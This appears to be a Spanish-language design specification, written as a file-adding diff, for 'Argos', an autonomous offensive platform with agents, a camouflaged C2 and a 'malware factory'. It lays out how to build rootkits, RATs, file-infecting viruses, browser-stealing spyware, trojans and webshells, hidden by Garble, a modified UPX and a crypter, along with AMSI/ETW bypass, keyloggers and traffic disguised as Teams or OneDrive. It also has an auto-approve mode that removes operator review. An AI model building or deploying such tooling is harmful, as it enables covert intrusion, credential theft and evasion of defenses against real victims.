@@ -1,0 +1,719 @@
+ARGOS — Especificación Técnica Definitiva v2.0
+Stack tecnológico consolidado
+Capa	Tecnología	Justificación
+Orquestador	Python 3.12	Velocidad de desarrollo, ecosistema de seguridad (Scapy, Impacket, NetworkX)
+Agentes de campo	Go 1.22+	Binarios estáticos sin dependencias, compilación cruzada, ofuscación con Garble
+Componentes kernel	Rust nightly	Seguridad de memoria, crates windows-rs y linux-kernel-module
+CLI	Click + Rich + Textual	Click para comandos, Rich para formato, Textual para TUI interactiva
+Comunicación	gRPC + Protobuf + WebSocket + uTLS	gRPC para API tipada, Protobuf binario compacto, uTLS para JA3 spoofing
+Base de datos vectorial	Qdrant (embebido)	Sin servidor externo, busca similitud en milisegundos
+Embeddings	Sentence-Transformers all-MiniLM-L6-v2 (80 MB)	Ligero, CPU, genera vectores de 384 dimensiones
+Grafos	NetworkX	Creación y recorrido de grafos, algoritmos A*
+Metasploit	pymetasploit3 vía msfrpcd	Ejecución de exploits y obtención de sesiones
+Ofuscación Go	Garble (-tiny -literals -seed=random)	Elimina strings, símbolos, y reduce tamaño
+Ofuscación Rust	obfstr + LLVM obfuscator	Ofuscación de strings y flujo de control
+Empaquetador	UPX modificado	Entrada mágica cambiada para evadir detección de UPX estándar
+1. Estructura definitiva del repositorio
+text
+Argos/
+├── core/                          # Director y lógica central
+│   ├── director.py                # Orquestador principal, bucle de eventos
+│   ├── knowledge_tree.py          # Grafo Vivo (NetworkX)
+│   ├── planner.py                 # Planificador A* con heurística enriquecida
+│   ├── cbr.py                     # Case-Based Reasoning (Qdrant + embeddings)
+│   ├── rules_engine.py            # Motor de reglas heurísticas (anytree)
+│   ├── decision_fusion.py         # Fusionador de decisiones ponderado
+│   ├── mission_dispatcher.py      # Configuración de modos (pentest/ctf) y perfiles
+│   ├── global_defense_state.py    # Nodo GDS, ajuste dinámico de sigilo
+│   └── event_bus.py               # Bus de eventos interno (pub/sub)
+├── agents/                        # Agentes ejecutores
+│   ├── stager/                    # Stager mínimo en Go
+│   │   ├── main.go
+│   │   ├── c2_client.go           # Cliente gRPC camuflado
+│   │   ├── module_loader.go       # Carga y ejecuta módulos en memoria
+│   │   └── go.mod
+│   ├── cell/                      # Agente completo en Go
+│   │   ├── main.go
+│   │   ├── modules/               # Módulos cargables dinámicamente
+│   │   │   ├── recon.go           # Escaneo TCP SYN, banner grabbing
+│   │   │   ├── exploit.go         # Ejecución de exploits
+│   │   │   ├── persist.go         # Persistencia adaptativa
+│   │   │   ├── keylogger.go       # Keylogger Windows/Linux
+│   │   │   ├── screenshot.go      # Captura de pantalla
+│   │   │   ├── file_browser.go    # Navegación de archivos
+│   │   │   ├── flag_hunter.go     # Búsqueda de flags (CTF)
+│   │   │   └── defense_shield.go  # Defensa de servicios (A/D)
+│   │   ├── evasion/               # Técnicas de evasión
+│   │   │   ├── amsi_bypass.go
+│   │   │   ├── etw_bypass.go
+│   │   │   ├── unhook.go
+│   │   │   ├── syscalls.go
+│   │   │   └── sleep_obfuscation.go
+│   │   ├── c2/
+│   │   │   ├── chameleon.go       # Camuflaje de tráfico
+│   │   │   └── hbe.go             # Human Behavior Emulation
+│   │   └── go.mod
+│   └── msf_agent.py               # Wrapper de Metasploit (agente especial)
+├── arsenal/                       # Fábrica de malware
+│   ├── builder.py                 # Orquestador de builds
+│   ├── templates/                 # Plantillas de código
+│   │   ├── rootkit_windows/       # Rust + windows-rs
+│   │   ├── rootkit_linux/         # Rust + linux-kernel-module
+│   │   ├── rat/                   # Go, agente completo
+│   │   ├── virus/                 # Go, infecta binarios
+│   │   ├── trojan/                # Go, señuelo + payload
+│   │   ├── spyware/               # Go, stealer de navegadores
+│   │   ├── exploit/               # Go/Python, exploits individuales
+│   │   ├── payload/               # Go/Rust, stagers y shellcode
+│   │   └── webshell/              # PHP, ASPX, JSP
+│   ├── obfuscation/               # Pipeline de ofuscación
+│   │   ├── garble_wrapper.py      # Invoca Garble con flags óptimos
+│   │   ├── upx_mod.py             # UPX modificado
+│   │   ├── crypter.py             # AES-GCM con clave de misión
+│   │   └── loader_gen.py          # Generador de loaders polimórficos
+│   └── output/                    # Binarios compilados por misión
+├── evasion/                       # Evasión a nivel de red y C2
+│   ├── chameleon_c2.py            # Servidor C2 con camuflaje
+│   ├── ja3_spoofer.py             # Configuración uTLS para agentes
+│   └── traffic_templates/         # Plantillas JSON de apps señuelo
+│       ├── teams.json
+│       ├── onedrive.json
+│       └── chrome_sync.json
+├── ctf/                           # Módulos específicos de CTF
+│   ├── flag_hunter.py             # Lógica de búsqueda de flags
+│   ├── auto_submitter.py          # Envío a CTFd y otras plataformas
+│   └── defensive_shield.py        # Monitorización y defensa A/D
+├── ui/                            # Interfaz de usuario (CLI)
+│   ├── cli.py                     # Punto de entrada principal (Click)
+│   ├── commands/                  # Implementación de cada comando
+│   │   ├── start.py
+│   │   ├── status.py
+│   │   ├── decide.py
+│   │   ├── agent.py
+│   │   ├── arsenal.py
+│   │   ├── report.py
+│   │   └── config.py
+│   └── tui.py                     # Modo interactivo (Textual)
+├── shared/                        # Recursos compartidos
+│   ├── proto/                     # Definiciones Protobuf
+│   │   └── argos.proto
+│   └── payloads/                  # Shellcodes y binarios base
+│       ├── windows_x64_shellcode.bin
+│       └── linux_x64_shellcode.bin
+├── database/                      # Modelos y migraciones
+│   ├── models.py                  # SQLAlchemy (misión, hosts, creds, eventos)
+│   ├── qdrant_client.py           # Cliente Qdrant para CBR
+│   └── migrations/
+├── docs/                          # Documentación
+│   ├── architecture.md
+│   ├── cli_guide.md
+│   └── api_proto.md
+├── tests/                         # Laboratorios de pruebas
+│   ├── docker-compose-lab.yml     # Entorno vulnerable
+│   ├── test_director.py
+│   ├── test_agent.go
+│   └── test_decision_engine.py
+├── scripts/                       # Utilidades
+│   ├── build_all.sh
+│   ├── generate_proto.sh
+│   └── deploy_lab.sh
+├── .env.example
+├── config.yaml                    # Configuración global de Argos
+├── Makefile
+└── README.md
+2. Modelo de datos del Grafo Vivo
+El grafo se implementa con NetworkX, pero se persiste en SQLite para reinicios de misión.
+
+2.1 Tipos de nodos y propiedades
+python
+# core/knowledge_tree.py
+
+from dataclasses import dataclass, field
+from typing import Dict, List, Optional
+import uuid
+
+@dataclass
+class HostNode:
+    id: str = field(default_factory=lambda: str(uuid.uuid4()))
+    ip: str
+    hostname: Optional[str] = None
+    os: Optional[str] = None
+    arch: Optional[str] = None
+    role: str = "unknown"           # workstation, server, dc, db, web, container
+    asset_value: int = 10           # 1-100
+    owned: bool = False              # ¿Tenemos sesión activa?
+    sessions: List[str] = field(default_factory=list)  # IDs de sesión
+
+@dataclass
+class ServiceNode:
+    id: str = field(default_factory=lambda: str(uuid.uuid4()))
+    host_id: str
+    port: int
+    protocol: str                   # tcp, udp
+    service_name: str               # ssh, http, mssql, smb, etc.
+    banner: Optional[str] = None
+    version: Optional[str] = None
+    cpe: Optional[str] = None       # Common Platform Enumeration
+
+@dataclass
+class CredentialNode:
+    id: str = field(default_factory=lambda: str(uuid.uuid4()))
+    username: str
+    type: str                       # password, ntlm_hash, kerberos_ticket, ssh_key
+    value: str                      # La credencial en sí
+    scope: str = "local"            # local, domain
+    source_host_id: Optional[str] = None  # Dónde se encontró
+    target_hosts: List[str] = field(default_factory=list)  # Dónde funciona
+
+@dataclass
+class VulnerabilityNode:
+    id: str = field(default_factory=lambda: str(uuid.uuid4()))
+    cve: Optional[str] = None
+    description: str
+    cvss_score: float = 0.0
+    exploit_module: str             # Ruta del módulo en el arsenal o MSF
+    service_id: str
+
+@dataclass
+class DefenseNode:
+    id: str = field(default_factory=lambda: str(uuid.uuid4()))
+    host_id: str
+    type: str                       # edr, waf, ids, honeypot
+    name: str                       # crowdstrike, defender, falco, etc.
+    aggressiveness: float = 0.5     # 0.0-1.0
+
+@dataclass
+class FlagNode:
+    id: str = field(default_factory=lambda: str(uuid.uuid4()))
+    value: str
+    host_id: str
+    captured_at: Optional[str] = None
+    submitted: bool = False
+2.2 Aristas
+python
+@dataclass
+class ExploitEdge:
+    source_host_id: str
+    target_host_id: str
+    technique: str                  # ssh_brute, smb_pth, rce_cve_xxx
+    probability: float = 0.5        # 0.0-1.0
+    stealth_cost: float = 0.5       # 0.0 (silencioso) - 1.0 (ruidoso)
+    mitre_technique_id: Optional[str] = None  # T1059.001, etc.
+2.3 Nodo GlobalDefenseState
+python
+class GlobalDefenseState:
+    """Nodo único que representa el nivel de alerta global de la red objetivo."""
+    def __init__(self):
+        self.score = 0.0            # 0.0 (normal) - 1.0 (defensa activa)
+
+    def update(self, event_type: str, severity: float):
+        """Actualiza el score basado en eventos de defensa detectados."""
+        if event_type == "edr_alert":
+            self.score = min(1.0, self.score + 0.3)
+        elif event_type == "honeypot_detected":
+            self.score = min(1.0, self.score + 0.6)
+        elif event_type == "agent_killed":
+            self.score = min(1.0, self.score + 0.4)
+        elif event_type == "timeout_no_activity":
+            self.score = max(0.0, self.score - 0.05)  # Decae lentamente
+3. Motor de decisión detallado
+3.1 Planificador A* (core/planner.py)
+python
+import networkx as nx
+from typing import List, Tuple
+
+class AStarPlanner:
+    def __init__(self, knowledge_tree: 'KnowledgeTree'):
+        self.graph = knowledge_tree.graph  # Grafo NetworkX con nodos y aristas ExploitEdge
+
+    def find_routes(self, start_host_id: str, goal_description: str, profile: str) -> List['Route']:
+        """
+        Encuentra las mejores rutas desde start_host_id hacia hosts que satisfagan el goal.
+        goal_description puede ser 'domain_admin', 'flag:CTF{*}', 'host:10.20.5.18', etc.
+        """
+        target_hosts = self._resolve_goal(goal_description)
+        routes = []
+        for target in target_hosts:
+            try:
+                # A* con heurística compuesta
+                path = nx.astar_path(
+                    self.graph,
+                    start_host_id,
+                    target,
+                    heuristic=self._heuristic(profile),
+                    weight='cost'
+                )
+                routes.append(self._build_route(path))
+            except nx.NetworkXNoPath:
+                continue
+        # Ordenar por score combinado
+        return sorted(routes, key=lambda r: r.score, reverse=True)
+
+    def _heuristic(self, profile: str):
+        """Heurística que combina distancia, sigilo y valor."""
+        def h(n1, n2):
+            host1 = self.graph.nodes[n1]['data']
+            host2 = self.graph.nodes[n2]['data']
+            distance = abs(int(host1.ip.split('.')[-1]) - int(host2.ip.split('.')[-1]))
+            stealth_bonus = 1.0 if profile == 'ghost' else 0.5 if profile == 'balanced' else 0.0
+            return distance * (1 - stealth_bonus)
+        return h
+
+    def _build_route(self, path: List[str]) -> 'Route':
+        """Convierte un camino de nodos en una Route con pasos detallados."""
+        steps = []
+        total_probability = 1.0
+        total_stealth = 0.0
+        for i in range(len(path) - 1):
+            edge = self.graph.edges[path[i], path[i+1]]['data']
+            steps.append(PlanStep(
+                source=path[i],
+                target=path[i+1],
+                technique=edge.technique,
+                probability=edge.probability,
+                stealth_cost=edge.stealth_cost
+            ))
+            total_probability *= edge.probability
+            total_stealth += edge.stealth_cost
+        return Route(steps=steps, total_probability=total_probability,
+                     avg_stealth=total_stealth / len(steps) if steps else 1.0)
+3.2 Case-Based Reasoning (core/cbr.py)
+python
+from qdrant_client import QdrantClient
+from sentence_transformers import SentenceTransformer
+import numpy as np
+
+class CaseBasedReasoner:
+    def __init__(self, qdrant_path: str = "./qdrant_data"):
+        self.client = QdrantClient(path=qdrant_path)
+        self.model = SentenceTransformer('all-MiniLM-L6-v2')  # 80 MB, CPU
+        self._init_collection()
+
+    def _init_collection(self):
+        """Crea la colección si no existe."""
+        from qdrant_client.models import Distance, VectorParams
+        try:
+            self.client.get_collection("cases")
+        except:
+            self.client.create_collection(
+                collection_name="cases",
+                vectors_config=VectorParams(size=384, distance=Distance.COSINE)
+            )
+
+    def add_case(self, service_description: str, action: str, success: bool, context: dict):
+        """Añade un caso a la base de conocimiento."""
+        vector = self.model.encode(service_description).tolist()
+        self.client.upsert(
+            collection_name="cases",
+            points=[{
+                "id": str(uuid.uuid4()),
+                "vector": vector,
+                "payload": {
+                    "description": service_description,
+                    "action": action,
+                    "success": success,
+                    "context": context
+                }
+            }]
+        )
+
+    def query_similar(self, service_description: str, top_k: int = 5) -> List[dict]:
+        """Busca los k casos más similares."""
+        vector = self.model.encode(service_description).tolist()
+        results = self.client.search(
+            collection_name="cases",
+            query_vector=vector,
+            limit=top_k
+        )
+        return [
+            {
+                "action": r.payload["action"],
+                "success": r.payload["success"],
+                "description": r.payload["description"],
+                "score": r.score
+            }
+            for r in results
+        ]
+3.3 Motor de reglas (core/rules_engine.py)
+Árboles de decisión dinámicos con anytree.
+
+python
+from anytree import Node, RenderTree
+
+class RulesEngine:
+    def __init__(self):
+        self.root = Node("root")
+
+    def evaluate(self, service: dict, defense_level: str, profile: str) -> List[dict]:
+        """
+        Evalúa el árbol de reglas y devuelve acciones ordenadas por prioridad.
+        service: {name, port, version, banner}
+        defense_level: 'none', 'low', 'medium', 'high'
+        profile: 'ghost', 'balanced', 'blitz'
+        """
+        actions = []
+        # Ejemplo: reglas para SSH
+        if service['name'] == 'ssh':
+            if defense_level in ['none', 'low']:
+                actions.append({"action": "brute_force", "params": {"dict": "ssh_top100"}, "priority": 0.9})
+            if profile == 'blitz':
+                actions.append({"action": "exploit_cve", "params": {"cve": "CVE-2024-6387"}, "priority": 0.7})
+            actions.append({"action": "default_creds", "params": {"creds": ["root:root", "admin:admin"]}, "priority": 0.5})
+        return sorted(actions, key=lambda a: a['priority'], reverse=True)
+3.4 Fusionador de decisiones (core/decision_fusion.py)
+python
+class DecisionFusion:
+    def __init__(self, config: dict):
+        self.thresholds = config.get('thresholds', {
+            'ghost': 0.85,
+            'balanced': 0.7,
+            'blitz': 0.4
+        })
+
+    def fuse(self, plan_routes: list, cbr_actions: list, rules_actions: list, profile: str) -> dict:
+        """
+        Combina las recomendaciones y decide la acción final.
+        Retorna {'action': ..., 'confidence': ..., 'needs_approval': bool}
+        """
+        # Convertir cada sugerencia a una acción estandarizada con peso
+        candidates = {}
+        for route in plan_routes[:1]:  # Mejor ruta del planificador
+            first_step = route.steps[0]
+            candidates[first_step.technique] = candidates.get(first_step.technique, 0) + 0.5
+
+        for cbr in cbr_actions[:2]:  # Top 2 casos similares
+            if cbr['success']:
+                candidates[cbr['action']] = candidates.get(cbr['action'], 0) + 0.3 * cbr['score']
+
+        for rule in rules_actions[:2]:  # Top 2 reglas
+            candidates[rule['action']] = candidates.get(rule['action'], 0) + 0.2 * rule['priority']
+
+        # Seleccionar la acción con mayor puntuación
+        if not candidates:
+            return {'action': None, 'confidence': 0, 'needs_approval': True}
+        best_action = max(candidates, key=candidates.get)
+        confidence = min(1.0, candidates[best_action])
+        threshold = self.thresholds[profile]
+        return {
+            'action': best_action,
+            'confidence': confidence,
+            'needs_approval': confidence < threshold
+        }
+4. Protocolos de comunicación (Chameleon C2)
+4.1 Definición Protobuf completa (shared/proto/argos.proto)
+protobuf
+syntax = "proto3";
+package argos;
+
+service AgentC2 {
+    rpc Register(AgentInfo) returns (RegisterAck);
+    rpc Beacon(stream AgentEvent) returns (stream DirectorCommand);
+    rpc ReportFinding(Finding) returns (FindingAck);
+}
+
+service OperatorConsole {
+    rpc WatchMission(MissionRequest) returns (stream MissionUpdate);
+    rpc ResolveDecision(DecisionResponse) returns (DecisionAck);
+    rpc SetMode(ModeChange) returns (ModeAck);
+    rpc ExecuteCommand(ManualCommand) returns (CommandResult);
+}
+
+message AgentInfo {
+    string agent_id = 1;
+    string hostname = 2;
+    string os = 3;
+    string arch = 4;
+    string ip = 5;
+    repeated string running_processes = 6;
+    map<string, string> metadata = 7;
+}
+
+message RegisterAck {
+    bool success = 1;
+    uint32 beacon_interval_sec = 2;
+    string mission_id = 3;
+}
+
+message AgentEvent {
+    string agent_id = 1;
+    EventType type = 2;
+    oneof event {
+        ScanResult scan = 3;
+        ExploitResult exploit = 4;
+        CredentialFound cred = 5;
+        FlagCaptured flag = 6;
+        DefenseAlert defense = 7;
+    }
+}
+
+message DirectorCommand {
+    string command_id = 1;
+    CommandType type = 2;
+    oneof payload {
+        ScanCommand scan_cmd = 3;
+        ExploitCommand exploit_cmd = 4;
+        PersistCommand persist_cmd = 5;
+        ExfilCommand exfil_cmd = 6;
+        PivotCommand pivot_cmd = 7;
+        CleanupCommand cleanup_cmd = 8;
+        DeployArsenalCommand arsenal_cmd = 9;
+    }
+    ExecutionProfile profile = 10;
+}
+
+enum ExecutionProfile {
+    GHOST = 0;
+    BALANCED = 1;
+    BLITZ = 2;
+}
+
+message Finding {
+    string agent_id = 1;
+    FindingType type = 2;
+    string description = 3;
+    bytes evidence = 4;
+    string flag_value = 5;
+}
+
+message ScanCommand {
+    repeated string targets = 1;
+    string scan_type = 2;  // tcp_syn, http_banner, smb, ldap
+    int32 rate = 3;        // paquetes por segundo
+}
+
+message DeployArsenalCommand {
+    string arsenal_type = 1;  // rootkit, rat, virus, trojan, spyware, webshell, payload
+    map<string, string> params = 2;
+}
+4.2 Camuflaje de tráfico en Go (agents/cell/c2/chameleon.go)
+go
+package c2
+
+import (
+    "crypto/tls"
+    "encoding/base64"
+    "encoding/json"
+    "net/http"
+    "time"
+    "github.com/refraction-networking/utls"
+)
+
+type ChameleonTransport struct {
+    decoyApp string  // teams, onedrive, chrome_sync
+}
+
+func (ct *ChameleonTransport) Send(protobufData []byte) error {
+    // 1. Serializar Protobuf a base64
+    b64payload := base64.StdEncoding.EncodeToString(protobufData)
+
+    // 2. Crear JSON falso de la app señuelo
+    var fakeJSON map[string]interface{}
+    switch ct.decoyApp {
+    case "teams":
+        fakeJSON = map[string]interface{}{
+            "evt": "userpresence",
+            "ts":  time.Now().Unix(),
+            "u":   "user@company.com",
+            "pl":  b64payload,
+            "sq":  rand.Intn(99999),
+        }
+    case "onedrive":
+        fakeJSON = map[string]interface{}{
+            "type":  "sync_chunk",
+            "fid":   "file_" + randomString(8),
+            "data":  b64payload,
+            "seq":   rand.Intn(9999),
+        }
+    }
+
+    // 3. Enviar vía WebSocket con uTLS (JA3 de Chrome)
+    config := &tls.Config{ServerName: ct.getDecoyDomain()}
+    conn, err := utls.Dial("tcp", ct.getDecoyEndpoint(), &utls.HelloChrome_Auto, config)
+    // ... enviar JSON por WebSocket
+}
+5. Agentes
+5.1 Stager Go mínimo (agents/stager/main.go)
+Flujo:
+
+Recopila AgentInfo (hostname, OS, IP, procesos corrientes).
+
+Se conecta al C2 con gRPC + Chameleon.
+
+Llama a Register.
+
+Recibe RegisterAck con intervalo de beacon.
+
+Bucle: espera, envía AgentEvent de latido, recibe DirectorCommand.
+
+Si recibe DeployArsenalCommand, descarga y ejecuta el binario del arsenal en memoria.
+
+5.2 Cell Go completo (agents/cell/)
+El Cell es el agente persistente. Tiene módulos activables según el comando recibido:
+
+recon.go: escaneo TCP SYN vía gopacket, banner grabbing HTTP/SMTP/SSH.
+
+exploit.go: ejecuta exploits locales o invoca Metasploit vía shell msfconsole -x.
+
+persist.go: lógica adaptativa (COM Hijacking, WMI, Registry, cron, systemd).
+
+keylogger.go: hooks de teclado en Windows (SetWindowsHookEx) y Linux (/dev/input).
+
+flag_hunter.go: búsqueda regex en disco, proc, env vars.
+
+defense_shield.go: monitoreo de integridad de archivos y reinicio de servicios.
+
+5.3 Wrapper de Metasploit (agents/msf_agent.py)
+python
+from pymetasploit3.msfrpc import MsfRpcClient
+
+class MSFAgent:
+    def __init__(self, password: str, port: int = 55553):
+        self.client = MsfRpcClient(password, port=port)
+
+    def execute_module(self, module_type: str, module_name: str, options: dict) -> dict:
+        """Ejecuta un módulo de Metasploit y retorna el resultado."""
+        module = self.client.modules.use(module_type, module_name)
+        for key, value in options.items():
+            module[key] = value
+        job = module.execute()
+        return {"job_id": job['job_id'], "uuid": job['uuid']}
+
+    def get_sessions(self) -> list:
+        """Lista las sesiones activas de Meterpreter."""
+        return list(self.client.sessions.list.keys())
+6. Arsenal de malware
+6.1 Builder (arsenal/builder.py)
+python
+class ArsenalBuilder:
+    def build(self, malware_type: str, target_os: str, arch: str, params: dict) -> str:
+        """
+        Construye un binario del arsenal.
+        Retorna la ruta del binario compilado y ofuscado.
+        """
+        template_path = f"arsenal/templates/{malware_type}"
+        output_path = f"arsenal/output/{malware_type}_{target_os}_{arch}_{uuid.uuid4()}"
+
+        # 1. Copiar template
+        # 2. Inyectar parámetros (C2 URL, clave de cifrado, ofuscación)
+        # 3. Compilar con Garble (Go) o cargo (Rust)
+        # 4. Ofuscar: crypter + UPX modificado + loader
+        if target_os == "windows":
+            subprocess.run(["garble", "-tiny", "-literals", "-seed=random",
+                            "build", "-o", output_path + ".exe", template_path])
+        elif target_os == "linux":
+            subprocess.run(["garble", "-tiny", "-literals", "-seed=random",
+                            "build", "-o", output_path, template_path])
+
+        # 5. Aplicar pipeline de ofuscación
+        self._apply_obfuscation(output_path)
+        return output_path
+
+    def _apply_obfuscation(self, binary_path: str):
+        """Pipeline de ofuscación post-compilación."""
+        # - Crypter: AES-GCM con clave de misión
+        # - UPX modificado: empaquetar con entrada mágica cambiada
+        # - Loader: wrapper que desencripta y ejecuta en memoria
+6.2 Catálogo detallado
+Tipo	Plantilla	Parámetros personalizables	Técnica de persistencia
+rootkit_windows	templates/rootkit_windows/ (Rust + windows-rs)	C2 URL, ofuscación, técnica (DKOM/PPL)	Driver cargado al arrancar
+rootkit_linux	templates/rootkit_linux/ (Rust + linux-kernel-module)	C2 URL, syscalls a hookear	Insmod al arrancar, systemd service
+rat	templates/rat/ (Go)	C2 URL, beacon interval, features (keylogger, screenshot)	COM Hijacking, WMI, cron
+virus	templates/virus/ (Go)	Método de propagación (USB, SMB), payload a incrustar	Infecta binarios locales
+trojan	templates/trojan/ (Go)	Señuelo (PDF/DOCX/EXE), payload	Se ejecuta al abrir el señuelo
+spyware	templates/spyware/ (Go)	Navegadores objetivo (Chrome, Firefox, Edge), datos a robar	Stealth, sin interfaz
+exploit	templates/exploit/ (Go/Python)	CVE, método de explotación, payload	Depende del exploit
+payload	templates/payload/ (Go/Rust)	Tipo (reverse_shell, bind, stager), C2 URL	Ninguna (se inyecta en otro proceso)
+webshell	templates/webshell/ (PHP/ASPX/JSP)	Método de ofuscación, mecanismo de persistencia	Toca archivos del servidor web
+7. CLI detallada
+7.1 Implementación con Click (ui/cli.py)
+python
+import click
+from ui.commands import start, status, decide, agent, arsenal, report, config
+
+@click.group()
+@click.version_option(version="2.0.0")
+def cli():
+    """Argos - Plataforma de Operaciones Ofensivas Autónoma"""
+    pass
+
+cli.add_command(start.start)
+cli.add_command(status.status)
+cli.add_command(decide.decide)
+cli.add_command(agent.agent)
+cli.add_command(arsenal.arsenal)
+cli.add_command(report.report)
+cli.add_command(config.config)
+
+if __name__ == "__main__":
+    cli()
+7.2 Comandos definitivos
+argos start
+
+bash
+argos start \
+  --target 10.20.0.0/16 \
+  --goal "domain_admin" \             # domain_admin | flag:CTF{*} | host:IP | exfil:path
+  --profile ghost \                   # ghost | balanced | blitz
+  --mode pentest \                    # pentest | ctf
+  --parallel 5 \                      # max agentes simultáneos
+  --msf \                             # habilitar Metasploit
+  --msf-password "abc123" \           # contraseña MSFRPC
+  --auto-decide \                     # no preguntar, solo notificar
+  --output-dir ./missions/acmecorp
+Resultado: Inicia el director en background y despliega el stager.
+
+argos status
+
+Sin argumentos abre la TUI con el Grafo Vivo, timeline y cola de decisiones.
+
+Con --json devuelve el estado actual en formato JSON para scripts.
+
+argos decide
+
+bash
+argos decide list                    # Listar decisiones pendientes
+argos decide show <id>               # Mostrar detalles de una decisión
+argos decide approve <id>            # Aprobar
+argos decide reject <id>             # Rechazar
+argos decide custom <id> "cmd"       # Reemplazar con comando personalizado
+argos decide auto --max-risk medium  # Auto-aprobar riesgos bajos/medios
+argos agent
+
+bash
+argos agent list                     # Listar agentes activos
+argos agent exec <id> "whoami"       # Ejecutar comando en agente
+argos agent upload <id> <src> <dst>  # Subir archivo
+argos agent download <id> <src> <dst># Descargar archivo
+argos agent kill <id>                # Matar agente y limpiar
+argos arsenal
+
+bash
+argos arsenal build rat \
+  --os windows --arch amd64 \
+  --c2 https://myc2.com \
+  --obfuscation garble,upx,crypter \
+  --features keylogger,screenshot,persist
+argos arsenal list                   # Listar binarios disponibles
+argos arsenal deploy <id> <agent_id> # Desplegar binario en agente
+argos report
+
+bash
+argos report generate --mission acmecorp --output ./reports/
+argos report executive --mission acmecorp
+argos report attck --mission acmecorp > attck_navigator.json
+argos report export --format pdf --mission acmecorp
+argos config
+
+bash
+argos config init                    # Crear ~/.argos/config.yaml
+argos config set c2.host 0.0.0.0
+argos config set c2.port 8443
+argos config show
+8. Roadmap de implementación
+Fase	Duración	Entregables
+Fase 1: Fundación	2 semanas	Estructura del repo, Protobuf, stubs, director básico (Grafo Vivo, bucle de eventos), stager Go (registro + beacon hueco)
+Fase 2: Motor de Decisión y Escaneo	4 semanas	Planificador A*, CBR con Qdrant y embeddings, motor de reglas SSH/HTTP/SMB, agente de reconocimiento completo (nmap + banners)
+Fase 3: Arsenal y Evasión	6 semanas	Fábrica de malware (RAT, payload, webshell), pipeline de ofuscación (Garble, UPX mod, crypter), Chameleon C2 funcional, integración Metasploit
+Fase 4: Post-explotación	4 semanas	Persistencia adaptativa, keylogger, screenshot, file browser, pivoteo automático, despliegue de rootkit
+Fase 5: CTF y TUI	2 semanas	Flag hunter, auto-submitter, defensive shield, TUI completa con Textual
+Fase 6: Beta y pulido	Continuo	Pruebas en HTB/TryHackMe, ampliación de reglas y casos, soporte MacOS/ARM
